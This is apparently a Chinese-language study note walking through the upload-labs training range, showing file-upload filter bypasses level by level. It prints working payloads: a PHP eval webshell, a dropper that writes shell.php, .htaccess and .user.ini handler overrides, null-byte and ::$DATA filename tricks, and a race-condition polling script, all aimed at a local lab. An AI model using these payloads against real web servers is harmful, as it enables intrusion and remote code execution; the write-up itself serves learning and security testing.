---
title: upload
date: 2025-01-22 15:22:47
tags:
- 文件上传
category:
- 学习笔记
---

# upload-labs



![](../image/upload-0.png)

## pass-01-js绕过

![](../image/upload-pass01-1.png)

![](../image/upload-pass01-2.png)

发现如果文件是php格式，会被拦截，且抓包抓不到东西，所以判断是前端js拦截

将文件格式改为jpg然后上传，并抓包

![](../image/upload-pass01-3.png)![](../image/upload-pass01-4.png)

这样就绕过前端验证了

拦截后将格式修改回php并放包

![](../image/upload-pass01-5.png)

发现已经上传成功了，使用蚁剑连接试试

![](../image/upload-pass01-6.png)

右键复制图片链接并在蚁剑中测试连接出现连接成功

![](../image/upload-pass01-7.png)

第二种方法：

直接在浏览器中禁用所有js代码

先打开开发者工具，然后点击右上角设置按钮

![](../image/upload-pass01-8.png)

停用javascript然后直接上传php文件即可

![](../image/upload-pass01-9.png)

第三种方法：

检查前端js代码

查看代码发现上传表单绑定了一个js

![](../image/upload-pass01-10.png)

js代码

![](../image/upload-pass01-11.png)

直接修改return true即可

![](../image/upload-pass01-12.png)

## pass-02-content-type绕过

![](../image/upload-pass02-1.png)

同样上传php文件，显示文件类型不正确，请重新上传，并且可以抓到包，所以判断验证是在后端进行的

![](../image/upload-pass02-2.png)

用bp抓包并把文件类型改为image/jpeg

![](../image/upload-pass02-3.png)

上传成功

![](../image/upload-pass02-4.png)

## pass-03-特殊后缀绕过

直接上传php文件，发现能够抓到包，所以判断验证是在后端进行的

![](../image/upload-pass03-1.png)

在传入php文件时，发现它提示不允许上传这些后缀文件传.asp,.aspx,.php,.jsp后缀文件,检查源码也发现这些

php环境可以尝试的后缀还有php1,php2,php3,php4,php5,phtmI,pht

直接抓包然后直接把php后缀名改为php3

![](../image/upload-pass03-2.png)

上传成功

![](../image/upload-pass03-3.png)

但是这里用蚁剑无法连接，说是Apache服务器不对php3以php格式解析，要修改配置文件。

## pass-04-.htaccess绕过

![](../image/upload-pass04-1.png)

先修改配置文件

通过源码和提示发现这关基本禁止了一切可以被解析的php文件

![](../image/upload-pass04-2.png)

但是.htaccess后缀没有被禁止，所以先写一下要上传的.htaccess配置文件

新建一个配置文件然后输入

```
AddType application/x-httpd-php .jpg .txt


这个也行
<FilesMatch 'mixbp.jpg'>
SetHandler application/x-httpd-php
</FilesMatch>
```

意思是能够将.jpg和.txt格式文件按php格式解析

![](../image/upload-pass04-3.png)

然后先上传.htaccess文件再上传jpg格式的php文件（内含一句话木马）

然后就能用蚁剑连接了

## pass-05-.user.ini绕过

前置知识

![](../image/upload-pass05-1.png)

![](../image/upload-pass05-2.png)

**.user.ini文件上传漏洞的前提：**

.user.ini可以生效并且该上传目录有php文件（比如这关后台的readme.php文件）

`auto_prepend_file` 是 PHP 的一个配置选项，可以用来指定一个文件，在每个 **PHP 脚本执行之前自动包含该文件的内容。这个文件会在 PHP 脚本的头部被包含执行，即在执行脚本之前会先执行这个文件。**

写法：

```
auto_prepend_file=mixbp.jpg
```

构造mixbp.jpg文件，内含一句话木马，并且输出包含成功方便判断是否包含成功
![](../image/upload-pass05-3.png)

auto_prepend file为自动包含文件

.user.ini文件里写auto_prepend file=mixbp.jpg （里面有一句话木马）

![](../image/upload-pass05-5.png)

然后就是先上传.ini文件，再上传jpg文件

然后通过访问服务器中的readme.php文件来实现auto_prepend_file功能
默认是要等待5分钟才能生效这里修改下配置文件，改成10秒

![](../image/upload-pass05-4.png)

上传完文件后访问readme.php

![](../image/upload-pass05-6.png)

包含成功，然后就能用蚁剑连接以下url

```
http://192.168.32.1/upload/upload/readme.php
```

### **点加空格加点绕过**

原理：查看源码发现源码会检验一遍文件名然后先去除末尾的.然后去除一个空格，之后就不会再进行检验了，.php. .去除一个.空格后就变成了.php. ，然后windows系统文件格式末尾的. 会在解析时自动去除，然后就能上传成功了

就是先上传php文件，然后抓包修改php格式为.php. .

![](../image/upload-pass05-7.png)

![](../image/upload-pass05-8.png)

![](../image/upload-pass05-9.png)

注意：这里由于末尾的.会自动去除，用蚁剑连接输入url的时候直接省去就行，但是好像不省去也行

## pass-06-大写绕过

原理：在系统中文件后缀格式会自动解析成小写，所以可以用大写绕过，且这关的源码查看后发现没有将后缀改为小写

步骤：

1. 上传mixbp.php
2. 抓包改写后缀为.Php（随便大写都行）
3. 上传成功复制图片链接然后蚁剑连接

这里会出现服务器错误，改成php+nginx就能成功连接了

## pass-07-空格绕过

原理：在文件格式后加空格，windows系统在解析文件时会自动删掉空格，这关源码没有首尾去空格

步骤：

1. 上传mixbp.php
2. 抓包改写后缀为.php    后面加几个空格
3. 上传复制图片链接然后蚁剑连接

## pass-08-后缀加点绕过

在后缀后面加点就完事了，其他和上面一样，原理也是后缀的点会自动去除

原理：

```
strrchr() 函数（在php中）查找字符在指定字符串中从右面开始的第一次出现的位置，如果成功，返回该字符以及其后面的字符

比如mixbp.php.
因为没有去除末尾的点,源码会取到后缀就是最后那个点
而单个的.不在黑名单中
```

## pass-09-$DATA绕过

前置知识：额外数据流
![](../image/upload-pass09-1.png)

写入方法：

```
在文件命令行里输入

echo 内容 >>文件名:额外数据流（可随便命名）

type 文件名1>>文件名2:数据流名 将文件名1的内容写到文件名2的额外数据流中

查看
notepad 文件名:额外数据流 用记事本来访问额外数据流
```

例如：

![](../image/upload-pass09-2.png)

```
这里的	echo "你好" >>1.txt:nihao	就是将"你好"写入额外数据流nihao中
notepad 1.txt:nihao	就是用记事本访问额外数据流
注意：直接打开1.txt是看不到额外数据流的
```

```
type 2.txt>>1.txt:study
将2.txt的内容写到1.txt的study额外数据流中
```

原理：**php在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持"::$DATA"之前的文件名** **，且windows中的文件后缀不允许有::$DATA出现，所以自动解析后会去除，且这关代码确实少了去除字符串::$DATA**

抓包后修改后缀加上::$DATA

![](../image/upload-pass09-3.png)

注意：把后面添加的::$DATA删除才能连接成功

![](../image/upload-pass09-4.png)

## pass-10-点空格点绕过

原理：查看源码发现源码会检验一遍文件名然后先去除末尾的.然后去除一个空格，之后就不会再进行检验了，.php. .去除一个.空格后就变成了.php. ，然后windows系统文件格式末尾的. 会在解析时自动去除，然后就能上传成功了。而后缀经过后端处理后变为了.不再黑名单中也能绕过

步骤：

就是先上传php文件，然后抓包修改php后缀，后面加上. .

## pass-11-双写后缀绕过

查看源码发现多了个函数
![](../image/upload-pass11-1.png)

原理：这个函数会从左到右检查$file_name如果其中存在$deny_ext数组中（黑名单）的后缀，会被替换为空值""，但是只替换一次，所以只要将后缀改为.pphphp即可

步骤：

1. 抓包修改后缀

   ![](../image/upload-pass11-2.png)

2. 蚁剑连接

## pass-12-%00截断

**前置知识：空字符**
0x00在编程语言中使用

%00在url编码中使用

url编码j就是先将ascii码值转为16进制，然后再加%。

相当于字符串结束标志，后面的内容不会被解析

原理：这关源码采用白名单，最终文件存放位置使用拼接形式，使用%00截断，`需要php版本<5.3.4`，并且`magic_quotes_gpc`关闭。

存放位置拼接

![](../image/upload-pass12-1.png)

从源码看出只要修改save_path然后用%00截断后面的路径就能让文件以php格式保存到指定路径

提交一个mixbp.jpg文件然后抓包，并修改save_path为../upload/mixbp.php%00

![](../image/upload-pass12-2.png)

打开图片链接后发现出现not found错误

![](../image/upload-pass12-3.png)

这是因为真实的保存路径是截断符号之前的内容所以无法打开，将截断符后面的内容删去即可

![](../image/upload-pass12-4.png)

连接成功

## psss-13-0x00截断

这关源码和上关差不多，只是上关是在get传参里修改url编码，这关是改post请求（这关的save_path是通过post请求得到）
最终文件存放位置使用拼接形式，所以可以使用0x00截断

注意：POST不会对里面的数据自动解码，需要在Hex中修改。

上传mixbp.jpg文件然后抓包后修改

在../upload/后添加mixbp.php空格，加空格是为了后续的hex修改，加其他字符也可以（就是一个占位符方便修改）

![](../image/upload-pass13-1.png)

添加完之后选中空格然后修改code Hex为00，就是将占位符改为十六进制的00（注意不能直接写0x00）

![](../image/upload-pass13-2.png)

然后放包上传成功就能复制图片链接用蚁剑连接了，后面的步骤和上关一样

## pass-14-字节标识绕过

前置知识：图片字节标识
![](../image/upload-pass14-1.png)

```
字节是计算机中存储和传输数据的基本单位，通常表示为一个八位（8-bit）的二进制数字序列。00000000

Utf-8中，一个英文字符占一个字节，中文（含繁体字）占三个字节
```

原理：查看源码发现这题会根据上传文件的前两个字节来判断文件格式，就是先将前两个字节从十六进制转换成十进制然后再白名单中比对。所以我们可以使用字节标识绕过

源码：

![](../image/upload-pass14-2.png)

例如：

```
png头两个字节为89 50转换为十进制刚好是137 80
```

步骤：

这里我们如果直接将php改成png后缀，上传会不成功，因为源码会对文件的前两个字节验证，所以我们先在一句话木马前加上aa，然后前面就会多出两个61，我们将其改为89 50

![](../image/upload-pass14-3.png)

这里改完之后就能上传成功了，但是这里不会将我们上传的文件按php解析，用蚁剑会连接失败，所以我们要通过文件包含漏洞来运行，这会让我们上传的文件以php格式被解析

![](../image/upload-pass14-4.png)

点击文件包含按钮，出现代码，这里用GET传参来接收file文件

![](../image/upload-pass14-5.png)

在url中加入?file=./upload/3120250123211252.png，因为这个include.php在我们上传的文件的上级目录所以用./upload/

![](../image/../image/upload-pass14-6.png)

然后就能用蚁剑连接了。

这关不改前两个字节也行，也能用图片马绕过

## pass-15-图片马绕过

前置知识：

![](../image/upload-pass15-1.png)

![](../image/upload-pass15-2.png)

原理：查看源码发现使用了getimagesize()函数和image_type_to_mime_type()函数，先将图像信息取出，然后将取出的图像类型常量值转换为MIME类型，从而验证文件类型。所以这里我们不能用字节标识绕过，但是可以用图片马绕过

```
copy  111.png/b+1.php a.png 将1.php中的内容拷进11.png中并重新生成png文件a
注意：这里注意把图片写在前面，将一句话木马写在后面才能解析成功
```

在这个命令中，`/b` 是一个参数，用于指示复制操作的模式。在 Windows 系统中，`/b` 参数用于指示 `copy` 命令执行二进制拷贝，即按字节进行拷贝，而不进行任何转换。

步骤：

将我们的php一句话木马拷进nailong.jpg中，最后生成出来一个hack.jpg图片里面就含有我们的一句话木马

![](../image/upload-pass15-3.png)

然后上传hack.jpg之后使用文件包含漏洞即可，步骤和前一关相同

## pass-16-图片马绕过

和上一关一样，只是源码稍微不一样

## pass-17-二次渲染绕过

查看源码发现这关检查了content-type和后缀，并且用imagecreatefromjpeg,imagecreatefrompng,imagecreatefromgif函数判断上传的是否为这三种类型的文件，并且使用了二次渲染，导致我们普通的图片马会被渲染，导致失效。

步骤：

这关好像只能用gif，因为gif渲染前后文件相同的部分较多，而另外两种类型比gif更脆弱且渲染前后相同区域少，这里上传我们正常的gif图片，上传成功后在浏览器中下载被渲染后的图片，然后使用010editor工具中的tools内的compare file功能比较我们上传之前的图片与渲染后的图片，这里我们就能找到蓝色区域（就是两张图片Hex没有变化的部分），插入我们的一句话木马，`<?php @eval($_POST['mixbp']);?>`

**注意：这里插入一句话木马要用粘贴不能自己输入，否则会出问题，并且尽量在匹配区域靠后的位置插入**

![](../image/upload-pass17-1.png)

上传之后使用文件包含漏洞打开

![](../image/upload-pass17-2.png)

然后就是蚁剑连接，与前面几关一样

第二种方法：这关也可以先将图片上传然后下载渲染后的文件，然后直接在渲染后的文件内插入一句话木马，因为这里的源码不会对渲染之后的文件再渲染了

## pass-18-条件竞争原理与绕过

前置知识：条件竞争

文件上传条件竞争前提：

服务器会先将任意类型文件放在服务器上，然后再判断合法性，非法则删除

文件上传条件竞争本质：

抢夺线程的资源，使得我们上传的生成木马的文件可以被快速访问运行一次，达到非法目的

![](../image/upload-pass18-1.png)

源码分析：服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名。如果不符合的话，unlink()函数就会删除该文件。

原理：如果这里有文件包含漏洞的话我们就能用前几关的图片马来绕过，但是这关没有，所以我们只能上传一个能够生成一句话木马的语句然后在这个语句被删除之前访问他（不能直接上传一句话木马访问，会被删除），利用burp多线程发包，然后不断在浏览器访问我们的shell，如果访问成功就会生成一句话木马

![](../image/upload-pass18-2.png)

![](../image/upload-pass18-3.png)

步骤：

上传11.php文件，内含`<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["mixbp"])?>');?>`，然后抓包

![](../image/upload-pass18-4.png)

把抓到的包放在intruder中设置攻击，清除payload$，这里选择null payloads然后选择无限重复，并在资源池内，将线程调到30，线程越高越容易访问到

![](../image/upload-pass18-5.png)

使用requests库构造一个python访问脚本，用来不断访问我们的11.php文件

```
import requests
url = "http://192.168.32.1/upload/upload/11.php"
while True:
    html = requests.get(url)
    if html.status_code == 200:
        print("OK")
        break
```

开始攻击并且运行python脚本，看到脚本输出ok，代表访问成功

![](../image/upload-pass18-7.png)

然后就能用蚁剑去连接我们的shell.php了，连接成功

![](../image/upload-pass18-8.png)

这里不使用python脚本也行，我们访问http://192.168.32.1/upload/upload/11.php路径然后抓取访问包，然后将访问包设置攻击，也是选择null payloads然后选择无限重复，调高线程成功访问概率会更大。然后就是先开启上传攻击，然后再访问攻击即可

## pass-19-apache解析漏洞+条件竞争

我们上传php文件，然后抓包改格式，源码会将我们的文件重命名为我们改的那个格式，又因为没有文件包含漏洞，不能将其以php格式解析，并且这里会先检查后缀，所以php文件还没有到服务器就被删掉了，所以这里不能用普通的条件竞争，要使用apache解析漏洞+条件竞争。

原理：apache不能解析.7z后缀名的文件，所以我们将11.php改为11.php.7z，这时apache会将其解析为11.php，从而实现绕过，然后这里我们的文件被转移到服务器后会被重命名，所以我们不断上传一个能生成一句话木马文件的小马，在被删除之前不断访问，即可得到shell

步骤：

将11.php文件上传然后抓包（内含<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["mixbp"])?>');?>），然后修改后缀为11.php.7z

![](../image/upload-pass19-1.png)

然后就是不断的上传和访问（http://xxx.xxx.xxx.xx.1/upload/upload/11.php.7z）攻击，和上一关一样，后续步骤也一样。

**注意：这关中，要实现多后缀解析漏洞需要在配置文件中修改配置 AddHandler application/x-httpd-php .php**
**还有就是我这关不知道为什么重命名前我的文件变成了upload11.php.7z**

## pass-20-后缀绕过总结

源码分析：这关会将保存名称最后一个点之后的内容当做后缀名并验证，所以前面的所有后缀绕过都行，相当于前面后缀绕过的总结

![](../image/upload-pass20-1.png)

```
这里各种后缀绕过都行
比如：
点绕过	upload-19.php.
点空格绕过	upload-19.php.空格	
点空格点绕过	upload-19.php. .
反斜杠	upload-19.php\.		因为move_uploaded_file函数在move的时候会把\忽略掉
抓包后0x00截断绕过	upload-19.php0x00.jpg		因为windows读到0x00就会被截断
抓包后$DATA绕过	upload-19.php::$DATA
```

## pass-21-审计+数组后缀绕过

代码审计

![](../image/upload-pass21-1.png)

验证步骤

```
1.验证content-type是否为image/jpeg||image/png||image/gif
2.判断用POST发送的保存名称是否为空，如果为空$file就用文件原名称，不为空就$file就用保存名称
3.判断$file是否为数组，如果不为数组就用explode()函数对$file以'.'来进行分割，使其变成数组
4.用end()函数取出$file数组的最后一个元素，然后判断该后缀是否合法
5.用reset()函数取出数组第一位，然后与'.'和$file[count($file) - 1]进行拼接来生成保存文件名$flie_name
6.使用move_uploaded_file()函数来将文件从临时目录转移到目标路径
```

```
explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。
end(array)函数，输出数组中的当前元素和最后一个元素的值。
reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值
count(array)函数，计算数组中的单元数目，或对象中的属性个数
```

原理：由于这里会将我们上传的保存名称分割为数组，但是我们直接发送数组，就可以绕过explode()，然后最后会将数组的第一位和第count($file)-1位进行拼接，所以我们只要保证数组第一位是1.php，然后第count($file-1)位为null即可拼接为1.php.在windows系统里会被自动删去后面的. 最后变为1.php，完成绕过

步骤：

上传我们的11.php（内含一句话木马）然后抓包，修改content-type为image/jpeg||image/png||image/gif

![](../image/upload-pass21-2.png)

然后修改我们的POST的参数为save_name[0]，然后将save_name[0]的值改为1.php，然后复制POST请求，粘贴到下面改为save_name[2]，值改为jpg||png||gif，这样就会使$file[count($file)-1]=$file[2-1]=$file[1]=null

![](../image/upload-pass21-3.png)

上传成功

![](../image/upload-pass21-4.png)

然后用蚁剑连接我们的一句话木马即可

## 文件幻术头

什么是文件幻术头
文件幻术头（也称为文件头、文件标识或魔术头）是文件的二进制数据中的一段特定字节序列，用于标识文件的类型或格式。它在文件的开头位置，并且通常是固定长度的。

### **文件幻术头的主要作用**

```
1.文件类型识别：文件幻术头可以帮助程序或操作系统识别文件的类型。通过读取文件幻术头的特定字节序列，可以确定文件的实际类型，例如图片文件、音频文件、视频文件等。这对于文件处理软件和操作系统来说非常重要，因为它们需要根据文件的类型采取不同的处理方式。
2.文件完整性验证：文件幻术头还可以用于验证文件的完整性。某些文件格式的幻术头包含了文件的校验和或哈希值，可以用于检测文件是否被篡改或损坏。例如，压缩文件格式如ZIP和GZIP在文件头中包含了校验和，可以用于验证文件的完整性。
3.文件类型扩展名关联：文件幻术头通常与文件的扩展名（例如.jpg、.png、.bmp等）关联。文件的扩展名通常用于表示文件类型，但它们可以被篡改或者不准确，而文件幻术头提供了一种更可靠的方式来确定文件的实际类型。这对于操作系统和文件管理工具来说非常重要，可以确保文件被正确地关联到相应的应用程序进行打开或处理。
4.绕过文件类型检查：某些服务器端对文件类型的检查可能仅仅是检查文件的扩展名而不是文件的内容。你可以尝试修改木马文件的内容，使其符合服务器端允许的文件类型的文件格式。例如，你可以通过在文件开头添加合法的文件头（如GIF的文件头）来绕过文件类型检查。
```

### **常见的图片文件格式文件幻术头**

```
JPEG文件（.jpg或.jpeg）的幻术头：FF D8 FF
PNG文件（.png）的幻术头：89 50 4E 47 0D 0A 1A 0A
GIF文件（.gif）的幻术头：47 49 46 38 39 61 或 47 49 46 38 37 61
BMP文件（.bmp）的幻术头：42 4D
TIFF文件（.tif或.tiff）的幻术头：4D 4D 00 2A 或 49 49 2A 00
ICO文件（.ico）的幻术头：00 00 01 00
WebP文件（.webp）的幻术头：52 49 46 46 xx xx xx xx 57 45 42 50，其中 xx 是文件大小的字节序列
```

注意这里的16进制文件幻术头是字符经过前端编码后得到的，例如GIF的47 49 46 38 39  61经过16进制转换为字符后就是GIF89a,而这个GIF89a可以直接放到木马脚本的前面，因为上传的时候前端回将其编码为47 49 46 38 39  61（这里再burp抓到的包可以看到hex）。而其他几种文件的幻术头解码为字符串放到木马脚本前面再传的时候还是不行（因为解码出来有些不是机器码所以复制的时候回乱码）这里可以直接去burp里面改16进制包（在不破坏包的情况下改木马前面的十六进制）
